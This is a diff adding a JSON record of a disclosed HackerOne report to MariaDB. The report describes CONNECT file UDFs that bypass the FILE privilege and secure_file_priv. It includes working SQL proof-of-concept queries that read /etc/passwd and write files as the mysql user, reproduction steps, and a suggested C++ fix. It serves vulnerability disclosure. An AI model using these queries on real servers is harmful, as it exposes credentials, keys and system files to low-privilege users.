@@ -1,0 +1,126 @@
+{
+  "id": 3836021,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zODM2MDIx",
+  "url": "https://hackerone.com/reports/3836021",
+  "title": "Missing FILE-privilege enforcement in CONNECT file UDFs allows server-side file read and write",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2026-07-01T12:04:17.878Z",
+  "submitted_at": "2026-07-01T12:04:18.684Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "duongtt",
+    "url": "/duongtt",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/x0y8zbvytv2plcbxxhaomfqmv5df/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 8724,
+    "url": "https://hackerone.com/mariadb",
+    "handle": "mariadb",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "MariaDB",
+      "twitter_handle": "mariadb_org",
+      "website": "https://mariadb.org",
+      "about": "MariaDB is a high performance, open source database that helps the world's busiest websites deliver more content, faster."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2024-27766"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-10-07T19:53:34.216Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-09-07T19:53:33.738Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\n\n- **What the bug lets you do.** With only `SELECT` privilege, read any file MariaDB can read (for example `/etc/passwd`, `my.cnf`, TLS private keys) and write files as the `mysql` OS user anywhere the process can write.\n- **Why that should not work.** Reading files from SQL normally requires the `FILE` privilege, and file paths are confined to `secure_file_priv`.\n- **What is missing.** CONNECT's file UDFs (`json_file`, `bson_file`, `jfile_make`, `bfile_make`, `jbin_file`) check neither `FILE` nor `secure_file_priv`.\n- **How we know it is a mistake, not a design choice.** The same CONNECT engine already enforces both checks on its file-backed *tables* (`ha_connect.cc:4538/4557/4559`). Only the UDF entry points were left ungated.\n- **Where it was reproduced.** MariaDB 12.3.2 GA (current Stable, what `mariadb:latest` pulls); the cited files are byte-identical on `mariadb-13.0.1-rc` and on `main`.\n\n## The attack\n\n**Setup.** The server is started with `--secure-file-priv=/tmp`, so file access is meant to be confined to `/tmp`. User `plain` has `SELECT` on one schema and no `FILE`.\n\n**Step 1 — the normal way is blocked, as expected:**\n\n```sql\nSELECT LOAD_FILE('/tmp/secret.json');   -- NULL: plain has no FILE privilege\nSELECT LOAD_FILE('/etc/passwd');        -- NULL: outside secure_file_priv (even a FILE user is blocked here)\n```\n\n**Step 2 — the same user reads any file via the CONNECT UDF:**\n\n```sql\nSELECT json_file('/etc/passwd');\n-- returns: root:x:0:0:root:/root:/bin/bash ...\n\nSELECT json_file('/tmp/secret.json');\n-- returns: {\"connect-udf-lab-secret\":\"...\"}\n```\n\n**Step 3 — the same user writes a file outside `secure_file_priv`, as the `mysql` OS user:**\n\n```sql\nSELECT jfile_make('{\"written\":\"plain-user\"}',\n                  '/var/lib/mysql/connect_udf_written.json', 0);\n-- creates the file (outside /tmp), owned mysql:mysql\n```\n\n**Net effect.** `FILE` and `secure_file_priv` become unenforceable against any user who can call these UDFs.\n\n## Details\n\n1. **The CONNECT table handler already gates file access with `FILE` and `secure_file_priv`; the file UDFs bypass both.**\n   - `storage/connect/ha_connect.cc` guards `FILE_NAME` table options at:\n     - [`:4538`](https://github.com/MariaDB/server/blob/mariadb-12.3.2/storage/connect/ha_connect.cc#L4538) `is_secure_file_path(path)`\n     - [`:4557`](https://github.com/MariaDB/server/blob/mariadb-12.3.2/storage/connect/ha_connect.cc#L4557) and [`:4559`](https://github.com/MariaDB/server/blob/mariadb-12.3.2/storage/connect/ha_connect.cc#L4559) `check_global_access(thd, FILE_ACL)`\n   - The file UDFs open paths through the same engine with neither check.\n   - The table handler already enforces both — the check exists, it just wasn't wired into the UDFs.\n\n2. **Read sinks in the UDFs reach the filesystem without any privilege gate.**\n   - `json_file` read ([`jsonudf.cpp:1587`](https://github.com/MariaDB/server/blob/mariadb-12.3.2/storage/connect/jsonudf.cpp#L1587) `GetFileLength`, [`:1904`](https://github.com/MariaDB/server/blob/mariadb-12.3.2/storage/connect/jsonudf.cpp#L1904) `GetJsonFile`), reached from the UDF body at [`:1636`](https://github.com/MariaDB/server/blob/mariadb-12.3.2/storage/connect/jsonudf.cpp#L1636) and [`:1690`](https://github.com/MariaDB/server/blob/mariadb-12.3.2/storage/connect/jsonudf.cpp#L1690).\n   - `bson_file` read ([`bsonudf.cpp:4422`](https://github.com/MariaDB/server/blob/mariadb-12.3.2/storage/connect/bsonudf.cpp#L4422) `bson_file_init` → [`:4450`](https://github.com/MariaDB/server/blob/mariadb-12.3.2/storage/connect/bsonudf.cpp#L4450) `GetFileLength(args->args[0])`; [`:4517`](https://github.com/MariaDB/server/blob/mariadb-12.3.2/storage/connect/bsonudf.cpp#L4517) `GetJsonFile`).\n   - `jbin_file` read ([`jsonudf.cpp:5763`](https://github.com/MariaDB/server/blob/mariadb-12.3.2/storage/connect/jsonudf.cpp#L5763) `jbin_file_init` → [`:5789`](https://github.com/MariaDB/server/blob/mariadb-12.3.2/storage/connect/jsonudf.cpp#L5789) `GetFileLength(args->args[0])`).\n   - No call to `check_global_access(thd, FILE_ACL)` or `is_secure_file_path()` precedes any of them. Confirmed by `grep -niE 'FILE_ACL|is_secure_file_path|secure_file_priv|check_global_access' jsonudf.cpp bsonudf.cpp` returning zero hits.\n\n3. **Write sinks in `jfile_make` and `bfile_make` serialize to caller-supplied paths with the same gap.**\n   - `jfile_make` write: [`jsonudf.cpp:4718`](https://github.com/MariaDB/server/blob/mariadb-12.3.2/storage/connect/jsonudf.cpp#L4718) `Serialize(g, jvp->GetJson(), fn, pretty)`.\n   - `bfile_make` write: [`bsonudf.cpp:4559`](https://github.com/MariaDB/server/blob/mariadb-12.3.2/storage/connect/bsonudf.cpp#L4559) → [`:4632`](https://github.com/MariaDB/server/blob/mariadb-12.3.2/storage/connect/bsonudf.cpp#L4632) `bnx.Serialize(g, jvp, fn, pretty)`.\n\n4. **The write primitive does not reach OS code execution on a standard installation.**\n   - Writing into `plugin_dir` fails on OS permissions (`mysql` does not own `plugin_dir`).\n   - The UDF loader rejects path separators and resolves only basenames from `plugin_dir`.\n   - Impact is file read and write, not RCE.\n\n## Triage note — CVE-2024-27766 distinction\n\nMariaDB disputed CVE-2024-27766 on the grounds that \"no privilege boundary is crossed\" and \"registration is an admin act.\" This finding is different on both points:\n\n- CVE-2024-27766 required `FILE` privilege plus write access to `plugin_dir`. This finding bypasses `FILE` entirely — the attacker needs only `SELECT`.\n- CVE-2024-27766 did not implicate `secure_file_priv`. This finding defeats `secure_file_priv` that the same CONNECT engine enforces on its own table path (ha_connect.cc:4538/4557/4559). The admin registered UDFs that discard a control the engine itself treats as mandatory elsewhere.\n\nThe asymmetry is the bug. An admin registering the UDFs as file-access helpers could reasonably expect them to respect the same `FILE` and `secure_file_priv` policy the engine applies to file-backed tables. They don't.\n\n## Patches\n\n1. Apply CONNECT's existing table-path policy to all file UDFs — require `FILE` and enforce `secure_file_priv` before opening or writing any path. This covers `json_file`, `bson_file`, `jfile_make`, `bfile_make`, and `jbin_file`, and any future `_file`-variant UDF.\n\n```cpp\n// Add to each file-UDF *_init function, before GetFileLength / GetJsonFile / Serialize:\nTHD *thd = current_thd;\nif (check_global_access(thd, FILE_ACL)) {\n    strcpy(message, \"FILE privilege required\");\n    return 1;\n}\nchar real_path[FN_REFLEN];\n// Canonicalize first so ../sequences don't bypass the check below:\nmy_realpath(real_path, args->args[0], MYF(0));\nif (!is_secure_file_path(real_path)) {\n    strcpy(message, \"path outside secure_file_priv\");\n    return 1;\n}\n```\n\n   Note: `is_secure_file_path` is currently a file-static helper in `ha_connect.cc`. The cleanest fix moves it (or a minimal equivalent using `opt_secure_file_priv` from `mysqld.h`) to a shared header so all UDF init functions can call it without duplication. This is consistent with what MDEV-13353 did for additional table types.\n\n2. Document that these UDFs read and write server-side files, so operators know registering them requires FILE-equivalent trust — it should be stated explicitly in the CONNECT KB page for `json_file` and `jfile_make`.\n\n## Reproduction\n\n1. Start MariaDB 12.3.2 with `--secure-file-priv=/tmp` (pass it as a `mysqld` command-line flag, e.g. `docker run mariadb:12.3.2 --secure-file-priv=/tmp`).\n\n   Install the CONNECT plugin package on the server host — `apt-get update && apt-get install -y mariadb-plugin-connect` (Debian/Ubuntu) or `mariadb-connect-engine` (RHEL/Rocky). The `apt-get update` is required on the official `mariadb:` Docker image, which ships with a stale apt cache. The SQL `INSTALL SONAME 'ha_connect'` in step 2 loads the plugin from that package; both steps are required.\n\n2. As a DBA account, load and register the UDFs:\n\n```sql\nINSTALL SONAME 'ha_connect';\n\nCREATE FUNCTION json_file  RETURNS STRING  SONAME 'ha_connect.so';\nCREATE FUNCTION jfile_make RETURNS STRING  SONAME 'ha_connect.so';\n```\n\n3. Create a low-privilege test account and a target file:\n\n```sql\nCREATE DATABASE testdb;\nCREATE USER 'plain'@'%' IDENTIFIED BY 'test';\nGRANT SELECT ON testdb.* TO 'plain'@'%';\n-- 'plain' has USAGE + SELECT only; no FILE.\n```\n\n```bash\necho '{\"connect-udf-lab-secret\":\"topsecret\"}' > /tmp/secret.json\n```\n\n4. As `plain`, verify the built-in path is blocked:\n\n```sql\nSELECT LOAD_FILE('/tmp/secret.json') IS NULL AS load_file_denied;\n-- expect: 1 (NULL — plain lacks FILE)\n```\n\n5. As `plain`, call the UDF read path:\n\n```sql\nSELECT json_file('/etc/passwd');         -- expect: `root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:...` (returned as one backslash-escaped string; non-JSON input is not rejected)\nSELECT json_file('/tmp/secret.json');    -- expect: {\"connect-udf-lab-secret\":\"topsecret\"}\n```\n\n6. As `plain`, call the UDF write path (the UDF returns the path string on success — no row count, no boolean; verify via `ls` afterwards):\n\n```sql\nSELECT jfile_make('{\"written\":\"plain-user\"}',\n                  '/var/lib/mysql/connect_udf_written.json', 0);\n-- returns: /var/lib/mysql/connect_udf_written.json\n```\n\n```bash\nls -la /var/lib/mysql/connect_udf_written.json\n# expect: -rw-rw---- mysql mysql 25 ... (file exists outside /tmp)\ncat /var/lib/mysql/connect_udf_written.json\n# expect: {\"written\":\"plain-user\"}\n```\n\n## Impact\n\n- Confidentiality: read any file the server process can access — credentials in config files, TLS private keys, system files (#2).\n- Integrity: write attacker-controlled JSON to any path `mysql` can write, outside `secure_file_priv` (#3).\n- Bypasses the `FILE` privilege and `secure_file_priv` boundary that confines SQL file access (#3).",
+  "weakness": {
+    "id": 26,
+    "name": "Improper Access Control - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2026-10-07T19:53:33.976Z",
+  "allow_singular_disclosure_after": -4534.925552583,
+  "singular_disclosure_allowed": true,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "high",
+    "score": 8.8,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 10335,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "MariaDB Server & Connectors - Access control bypass",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
